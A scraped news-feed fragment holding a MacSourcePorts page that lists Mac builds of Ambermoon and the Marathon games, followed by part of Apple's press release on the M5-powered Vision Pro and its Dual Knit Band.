}--><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/icon_intel.png" width="20px">&nbsp; Build for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured from 2008-2023." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs. Playable on <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> Macs via Rosetta 2. </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Full Game</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/Pyrdacor/Ambermoon.net/releases/download/v1.11.4/Ambermoon.net-Mac.zip">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version v1.11.4</span></p><!--bindings={
  "ng-reflect-ng-if": "v1.11.4"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.15 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.15"
}--></div><p>Build date: August 30, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Bungie<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;December 21, 1994<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;January 2000</span><!--bindings={
  "ng-reflect-ng-if": "January 2000"
}--></p><div _ngcontent-qyv-c32=""><p>The year is 1994. The world can't get enough of <em>DOOM</em>. Everyone that is except for you because you own an Apple Macintosh and <em>DOOM</em> is a PC game. You comfort yourself with your superior port of <em>Wolfenstein 3-D</em> but it's just not the same.</p><p>Bungie Software Products Corporation to the rescue! <em>Marathon</em> was released as the Mac's answer to <em>DOOM</em>, and a game which was its opposite, as it was not on the PC. Bungie would go on to make a trilogy of games in the <em>Marathon</em> universe before starting work on the Mac-exclusive <em>Halo</em></p><p>Of course what really happened is Microsoft bought Bungie and <em>Halo</em> became an Xbox exclusive. <em>Halo</em> and <em>Marathon</em> may not share a universe, but Bungie put <em>Marathon</em> references in all of their <em>Halo</em> titles, including <a href="https://www.mobygames.com/game/xbox/halo-combat-evolved/cover-art/gameCoverId,9494/" target="_new">embedding the <em>Marathon</em></a> logo in the original <em>Halo</em> box art.</p><p>Bungie released all three <em>Marathon</em> titles as freeware in 2005 so the downloads from the Aleph One project include the entire game. No need to dig out your old discs here.</p></div><!--bindings={}--><!--bindings={}--><!--bindings={}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/marathon_ss1.jpg"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Full Game</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/Aleph-One-Marathon/alephone/releases/download/release-20250829/Marathon-20250829-Mac.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.11</span></p><!--bindings={
  "ng-reflect-ng-if": "1.11"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.13 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.13"
}--></div><p>Build date: August 29, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><game-info _ngcontent-qyv-c37="" _nghost-qyv-c32="" ng-reflect-game="[object Object]"><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><div _ngcontent-qyv-c32=""><p _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Developer:</strong>&nbsp;Bungie<br _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Release Date:</strong>&nbsp;November 24, 1995<br _ngcontent-qyv-c32=""><span _ngcontent-qyv-c32=""><strong _ngcontent-qyv-c32="">Source Code Release Date:</strong>&nbsp;January 2000</span><!--bindings={
  "ng-reflect-ng-if": "January 2000"
}--></p><div _ngcontent-qyv-c32=""><p><em>Marathon 2</em>, released a year after the original, was also released for Windows 95. The game featured engine improvements and a plot that took place 17 years after the original. The graphics for this release have been upgraded from the release on XBLA.</p><p>Bungie released all three <em>Marathon</em> titles as freeware in 2005 so the downloads from the Aleph One project include the entire game. No need to dig out your old discs here.</p></div><!--bindings={}--><!--bindings={}--><!--bindings={}--></div><p><img _ngcontent-qyv-c32="" width="240" height="135" src="https://www.macsourceports.com/assets/marathon2_ss1.jpg"></p></div><p><span _ngcontent-qyv-c32="">Source Port<!--bindings={
  "ng-reflect-ng-if": "false"
}-->: </span></p><div _ngcontent-qyv-c32=""><build-info _ngcontent-qyv-c32="" _nghost-qyv-c31="" ng-reflect-build="[object Object]"><div _ngcontent-qyv-c31=""><p><span _ngcontent-qyv-c31=""><img _ngcontent-qyv-c31="" src="https://www.macsourceports.com/assets/universal_2_icon.png" width="20px">&nbsp; Universal 2 for <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with M1 or later processors. Manufactured since 2020." ng-reflect-ngb-tooltip="Macs with M1 or later processo">Apple Silicon</strong><!--container--> and <strong _ngcontent-qyv-c31="" ngbtooltip="Macs with 64-bit Intel processors. Manufactured since 2008." ng-reflect-ngb-tooltip="Macs with 64-bit Intel process">64-Bit Intel</strong><!--container--> Macs </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--><!--bindings={
  "ng-reflect-ng-if": "false"
}--> &nbsp; <!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Signed</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Notarized</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><p><span _ngcontent-qyv-c31=""><p>Full Game</p>&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={}--><!--bindings={}--><!--bindings={}--><p><span _ngcontent-qyv-c31=""><p>Third Party Build</p><!--container-->&nbsp; </span></p><!--bindings={
  "ng-reflect-ng-if": "true"
}--><br _ngcontent-qyv-c31=""><div _ngcontent-qyv-c31=""><fa-icon _ngcontent-qyv-c31="" ng-reflect-icon="[object Object]"></fa-icon>&nbsp; <p><strong _ngcontent-qyv-c31=""><a _ngcontent-qyv-c31="" href="https://github.com/Aleph-One-Marathon/alephone/releases/download/release-20250829/Marathon2-20250829-Mac.dmg">Download</a></strong>&nbsp;&nbsp;<span _ngcontent-qyv-c31="">Version 1.11</span></p><!--bindings={
  "ng-reflect-ng-if": "1.11"
}--><p><span _ngcontent-qyv-c31="">, requires macOS 10.13 or later</span></p><!--bindings={
  "ng-reflect-ng-if": "10.13"
}--></div><p>Build date: August 29, 2025</p></div></build-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--><p><a _ngcontent-qyv-c32="">Installation instructions</a></p></div><!--bindings={
  "ng-reflect-ng-for-of": "[object Object]"
}--></div></game-info><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-if": "true"
}--><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--><!--bindings={
  "ng-reflect-ng-for-of": "[object Object],[object Object"
}--></home><!--container--><p>Copyright © 2025 MacSourcePorts.com&nbsp;&nbsp;|&nbsp;&nbsp;<a _ngcontent-qyv-c46="" href="mailto:tom@macsourceports.com">Contact Us</a></p><br _ngcontent-qyv-c46=""></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple Vision Pro upgraded with M5 chip (242 pts)]]></title>
            <link>https://www.apple.com/newsroom/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/</link>
            <guid>45591801</guid>
            <pubDate>Wed, 15 Oct 2025 13:03:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/">https://www.apple.com/newsroom/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/</a>, See on <a href="https://news.ycombinator.com/item?id=45591801">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        <div>
                    
                    
                        <span>PRESS RELEASE</span>
                    
                    
                        <span>October 15, 2025</span>
                    
                    
                </div>

        <div>
                
                
                
                    <h2>
                        
    
        Apple Vision Pro upgraded with the powerful M5&nbsp;chip and comfortable Dual&nbsp;Knit&nbsp;Band
    

                    </h2>
                
            </div>

        <div>
                
                
                    The latest version improves performance, display rendering, battery life, and comfort, while offering innovative features&nbsp;with visionOS&nbsp;26 and all-new spatial apps and Apple&nbsp;Immersive&nbsp;content
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    












    


    
    
    


     
     
    
    
        <div>
             
                 <div><span>CUPERTINO, CALIFORNIA</span> Apple today introduced <a href="https://www.apple.com/apple-vision-pro/" target="_blank">Apple Vision Pro</a> with the powerful <a href="https://www.apple.com/newsroom/2025/10/apple-unleashes-m5-the-next-big-leap-in-ai-performance-for-apple-silicon/" target="_blank">M5 chip</a> that delivers a leap forward in performance, improved display rendering, faster AI-powered workflows, and extended battery life. The upgraded Vision Pro also comes with the soft, cushioned Dual Knit Band to help users achieve an even more comfortable fit, and visionOS 26, which unlocks innovative spatial experiences, including widgets, new Personas, an interactive Jupiter Environment, and new Apple Intelligence features with support for additional languages.<sup>1</sup> There are over 1 million apps and thousands of games on the App Store, hundreds of 3D movies on the Apple TV app, and all-new series and films in Apple Immersive with a selection of live NBA games coming soon. Vision Pro with M5 and the Dual Knit Band is now available to pre-order on <a href="https://apple.com/" target="_blank">apple.com</a>. Customers can <a href="https://www.apple.com/retail/instore-shopping-session/session-selection/?topic=visionpro" target="_blank">book a demo</a> at Apple Store locations today and it will be available nationwide beginning Wednesday, October 22.
</div>
                 
             
                 <div>“With the breakthrough performance of M5, the latest Apple Vision Pro delivers faster performance, sharper details throughout the system, and even more battery life, setting a new standard for what’s possible in spatial computing,” said Bob Borchers, Apple’s vice president of Worldwide Product Marketing. “Paired with the comfortable Dual Knit Band, innovative features in visionOS 26, and all-new Apple Immersive experiences spanning adventure, documentary, music, and sports, spatial computing is even more capable, entertaining, and magical with the new Vision Pro.”
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>visionOS 26 offers powerful spatial experiences, including support for 180-degree, 360-degree, and wide field-of-view video from select action cameras made by Canon, Insta360, and GoPro.</div>
        
            <a aria-label="Download video: Apple Vision Pro Immersive Experience" data-analytics-title="Download video - Apple Vision Pro Immersive Experience" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/10/apple-vision-pro-immersive-experience/downloads/Apple-Vision-Pro-Immersive-experience-251015.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Leap Forward in Performance with M5</strong>
</h2>
                 
             
                 <div>M5 provides an even faster, smoother, and more responsive experience for Apple Vision Pro users, while introducing new opportunities for developers to create more advanced spatial and immersive experiences. Built using third-generation 3-nanometer technology, M5 on Vision Pro features an advanced 10-core CPU that delivers higher multithreaded performance, resulting in faster experiences throughout the system, including faster load times for apps and widgets and more responsive web browsing. The next-generation 10-core GPU architecture brings support for hardware-accelerated ray tracing and mesh shading, enabling developers to add remarkable detail to lighting, shadows, and reflections in games like Control.
</div>
                 
             
                 <div>With M5, Apple Vision Pro renders 10 percent more pixels on the custom micro-OLED displays compared to the previous generation, resulting in a sharper image with crisper text and more detailed visuals. Vision Pro can also increase the refresh rate up to 120Hz for reduced motion blur when users look at their physical surroundings, and an even smoother experience when using Mac Virtual Display. Vision Pro with M5 works alongside the purpose-built R1 chip, which processes input from 12 cameras, five sensors, and six microphones, and streams new images to the displays within 12 milliseconds to create a real-time view of the world. The high-performance battery now supports up to two and a half hours of general use, and up to three hours of video playback, all on a single charge.<sup>2</sup> And it’s easy to use Vision Pro for longer periods at home, at an office, or while commuting by connecting the battery to power.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>With M5, Vision Pro can increase the refresh rate up to 120Hz for reduced motion blur when users look at their physical surroundings, and an even smoother experience when using Mac Virtual Display.</div>
        
            <a aria-label="Download video: Apple Vision Pro Mac Virtual Display" data-analytics-title="Download video - Apple Vision Pro Mac Virtual Display" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/10/apple-vision-pro-mac-virtual-display/downloads/Apple-Vision-Pro-Mac-Virtual-Display-251015.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>The 16-core Neural Engine makes AI-powered features run up to 50 percent faster for system experiences — like capturing a Persona or transforming photos into spatial scenes — and up to 2x faster for third-party apps compared to the previous generation.<sup>3</sup> With M5, developers such as JigSpace are pioneering new use cases for enterprises that combine spatial computing with on-device AI. Using Apple’s Foundation Models framework, the new JigSpace app for Vision Pro taps into the on-device model at the core of Apple Intelligence to make complex information easier to understand. Users can parse through complex datasets with natural language and learn about sophisticated objects, like wind turbines, using interactive 3D models.
</div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="m5-chip">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-eede504cb38b0b7a671de28afa7b0029" href="#gallery-eede504cb38b0b7a671de28afa7b0029" data-ac-gallery-trigger="gallery-eede504cb38b0b7a671de28afa7b0029"><span>An image of the M5 chip and R1 chip in Apple Vision Pro.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-3820aa2b4086079a3f93de04d0b5d513" href="#gallery-3820aa2b4086079a3f93de04d0b5d513" data-ac-gallery-trigger="gallery-3820aa2b4086079a3f93de04d0b5d513"><span>An image of an interactive 3D model from the JigSpace app for Apple Vision Pro.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-eede504cb38b0b7a671de28afa7b0029" aria-labelledby="gallery-dotnav-eede504cb38b0b7a671de28afa7b0029" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:m5-chip-01">
                                
                                <div>
                                    <div>Built using third-generation 3-nanometer technology, M5 features an advanced 10-core CPU that delivers higher multithreaded performance, resulting in faster experiences throughout the system.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-M5-and-R1-chips-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-M5-and-R1-chips-251015_big" aria-label="Download media, An image of the M5 chip and R1 chip in Apple Vision Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-3820aa2b4086079a3f93de04d0b5d513" aria-labelledby="gallery-dotnav-3820aa2b4086079a3f93de04d0b5d513" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:m5-chip-02">
                                
                                <div>
                                    <div>With M5, developers such as JigSpace are pioneering new use cases for enterprises that combine spatial computing with on-device AI.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-JigSpace-app-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-JigSpace-app-251015_big" aria-label="Download media, An image of an interactive 3D model from the JigSpace app for Apple Vision Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>The New Dual Knit Band Offers a More Comfortable Fit</strong>
</h2>
                 
             
                 <div>The Dual Knit Band delivers an even more comfortable fit for users. It features upper and lower straps that are 3D-knitted as a single piece to create a unique dual-rib structure that provides cushioning, breathability, and stretch. The lower strap features flexible fabric ribs embedded with tungsten inserts that provide a counterweight for additional comfort, balance, and stability. And the intuitive dual-function Fit Dial allows users to make fine-tuned adjustments to achieve their ideal fit. The new Dual Knit Band comes in small, medium, and large sizes; is available to purchase separately; and is compatible with the previous-generation Apple Vision Pro. Customers can easily find the size that is right for them using the <a href="https://apps.apple.com/us/app/apple-store/id375380948" target="_blank">Apple Store app for iPhone</a><span>.</span>
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="dual-knit-band">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-8dee540600e5b61c0a8bc8b575249aee" href="#gallery-8dee540600e5b61c0a8bc8b575249aee" data-ac-gallery-trigger="gallery-8dee540600e5b61c0a8bc8b575249aee"><span>An image that shows a side view of the Dual Knit Band.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-5a1f65a8d885cba1e6ecf8ffc6e5e21d" href="#gallery-5a1f65a8d885cba1e6ecf8ffc6e5e21d" data-ac-gallery-trigger="gallery-5a1f65a8d885cba1e6ecf8ffc6e5e21d"><span>An image that shows a close-up of the Dual Knit Band.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-dc2580c07021274a70c311e095b0f12f" href="#gallery-dc2580c07021274a70c311e095b0f12f" data-ac-gallery-trigger="gallery-dc2580c07021274a70c311e095b0f12f"><span>An image that shows a close-up of the Fit Dial in the Dual Knit Band.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-8dee540600e5b61c0a8bc8b575249aee" aria-labelledby="gallery-dotnav-8dee540600e5b61c0a8bc8b575249aee" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:dual-knit-band-01">
                                
                                <div>
                                    <div>The Dual Knit Band features upper and lower straps that are 3D-knitted as a single piece to create a unique dual-rib structure that provides cushioning, breathability, and stretch.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Dual-Knit-Band-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Dual-Knit-Band-251015_big" aria-label="Download media, An image that shows a side view of the Dual Knit Band."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-5a1f65a8d885cba1e6ecf8ffc6e5e21d" aria-labelledby="gallery-dotnav-5a1f65a8d885cba1e6ecf8ffc6e5e21d" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:dual-knit-band-02">
                                
                                <div>
                                    <div>The lower strap features flexible fabric ribs embedded with tungsten inserts that provide a counterweight for additional comfort, balance, and stability.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Dual-Knit-Band-close-up-01-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Dual-Knit-Band-close-up-01-251015_big" aria-label="Download media, An image that shows a close-up of the Dual Knit Band."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-dc2580c07021274a70c311e095b0f12f" aria-labelledby="gallery-dotnav-dc2580c07021274a70c311e095b0f12f" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:dual-knit-band-03">
                                
                                <div>
                                    <div>The intuitive dual-function Fit Dial allows users to make fine-tuned adjustments to achieve their ideal fit.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Dual-Knit-Band-close-up-02-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Dual-Knit-Band-close-up-02-251015_big" aria-label="Download media, An image that shows a close-up of the Fit Dial in the Dual Knit Band."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Powerful Spatial Experiences with visionOS 26</strong>
</h2>
                 
             
                 <div><a href="https://www.apple.com/os/visionos/" target="_blank">visionOS 26</a> brings a set of powerful spatial experiences to Apple Vision Pro. Widgets seamlessly integrate into a user’s space and reappear every time they put Vision Pro on, making it easy to check the time or weather, play music or podcasts, decorate their space with photos, or access ChatGPT. Striking enhancements to Persona make communicating in apps like FaceTime feel even more natural and familiar. Spatial scenes, which use generative AI to add lifelike depth to photos, make memories come to life. Users can play back 180-degree, 360-degree, and wide field-of-view video from popular action cameras, so they can enjoy their footage the way it was meant to be seen, and creators can publish videos in these formats to apps like Safari and Vimeo. <span>With iPadOS 26.1, available later this fall, the </span><a href="https://apps.apple.com/us/app/apple-vision-pro/id6502614761" target="_blank">Apple Vision Pro app</a><span> comes to </span><a href="https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/" target="_blank">iPad</a><span>, offering users another great way to discover new content, queue apps and games to download, find tips, and quickly access information about their Vision Pro.</span>
</div>
                 
             
                 <h2><strong>New Apps, Content, and Games to Explore</strong>
</h2>
                 
             
                 <div>There are over 1 million apps available for Apple Vision Pro, including more than 3,000 apps built for visionOS. Users can design their dream home with HomeByMe and Lowe’s Style Studio, outfit their closet with Balenciaga, and browse stunning artwork with Christie’s Select and Art Authority Museum. They can explore extraordinary locations around the world with Epic Earth and Explore POV, transform their physical space into a planetarium with Space Vision, or travel back in time with D-Day: The Camera Soldier.
</div>
                 
             
                 <div>Apple Vision Pro remains the ultimate entertainment device. With the new Vision Pro, users can experience concerts like never before with Amplium; tune into their favorite teams with apps from major sports leagues; or enjoy a personal theater with apps from popular streaming services on a screen that appears up to 100 feet wide. Apple Immersive continues to redefine what is possible in storytelling, and Vision Pro users can enjoy new series and films on the Apple TV app. Later this season, users in the Lakers’ broadcast territory will be able to watch select live games in Apple Immersive, and <a href="https://nr.apple.com/DE6M6F5Ws2" target="_blank">new titles</a> from the Audi F1 Project, the BBC, HYBE, and Red Bull will launch in Apple Immersive in the coming months.<sup>4</sup> The Apple TV app is also home to one of the largest digital collections of 3D movies available, featuring recent blockbusters like <em>Superman</em>, <em>Jurassic World Rebirth</em>, <em>How to Train Your Dragon</em>, and <em>Wicked</em>.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="apple-immersive-video">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-bdd1ac7b840d2e6ee79e28ad97219694" href="#gallery-bdd1ac7b840d2e6ee79e28ad97219694" data-ac-gallery-trigger="gallery-bdd1ac7b840d2e6ee79e28ad97219694"><span>Artwork for the Apple Immersive Video experience.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-32e23dd4b91890db1f310370b1fd425e" href="#gallery-32e23dd4b91890db1f310370b1fd425e" data-ac-gallery-trigger="gallery-32e23dd4b91890db1f310370b1fd425e"><span>Image from the Apple Immersive film “Tour De Force.”</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-37db066ab267b9b5ce4878646e6b840b" href="#gallery-37db066ab267b9b5ce4878646e6b840b" data-ac-gallery-trigger="gallery-37db066ab267b9b5ce4878646e6b840b"><span>Image from the Backcountry Skiing episode of the Apple Immersive series “World of Red Bull.”</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-ea6440e2e7fe17c60e2f171d76f47471" href="#gallery-ea6440e2e7fe17c60e2f171d76f47471" data-ac-gallery-trigger="gallery-ea6440e2e7fe17c60e2f171d76f47471"><span>Image from the Maine episode of the Apple Immersive series “Elevated.”</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-bdd1ac7b840d2e6ee79e28ad97219694" aria-labelledby="gallery-dotnav-bdd1ac7b840d2e6ee79e28ad97219694" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:apple-immersive-video-01">
                                
                                <div>
                                    <div>Apple Immersive continues to redefine what is possible in storytelling. Apple Vision Pro users can enjoy new series and films on the Apple TV app, including <i>Metallica</i>, <i>Submerged</i>, <i>The Weeknd: Open Hearts</i>, and <i>VIP: Yankee Stadium</i>.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Immersive-films-experience-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Immersive-films-experience-251015_big" aria-label="Download media, Artwork for the Apple Immersive Video experience."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-32e23dd4b91890db1f310370b1fd425e" aria-labelledby="gallery-dotnav-32e23dd4b91890db1f310370b1fd425e" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:apple-immersive-video-02">
                                
                                <div>
                                    <div><em>Tour De Force</em> from CANAL+ and MotoGP is now available on the Apple TV app.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-vision-pro-upgraded-with-the-m5-chip-and-dual-knit-band/article/Apple-Vision-Pro-Immersive-films-Tour-De-Force-251015.zip" download="" data-analytics-title="download image - Apple-Vision-Pro-Immersive-films-Tour-De-Force-251015_big" aria-label="Download media, Image from the Apple Immersive film “Tour De Force.”"></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-37db066ab267b9b5ce4878646e6b840b" aria-labelledby="gallery-dotnav-37db066ab267b9b5ce4878646e6b840b" data-gallery-item="">
